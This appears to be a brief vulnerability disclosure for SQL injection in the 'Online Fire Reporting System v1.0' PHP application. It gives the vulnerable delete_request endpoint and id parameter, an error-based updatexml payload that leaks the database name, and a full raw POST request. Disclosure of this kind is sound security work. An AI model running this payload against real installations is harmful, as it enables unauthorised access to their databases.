# Online Fire Reporting System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15346/online-fire-reporting-system-phpoop-free-source-code.html

Vulnerability File: /ofrs/classes/Master.php?f=delete_request

Vulnerability location: /ofrs/classes/Master.php?f=delete_request, id

[+] Payload: id=6' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id

```sql
POST /ofrs/classes/Master.php?f=delete_request HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

id=6' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
```

![image](https://user-images.githubusercontent.com/54017627/170816897-77d37598-bfc5-491e-b868-8242fda4227d.png)
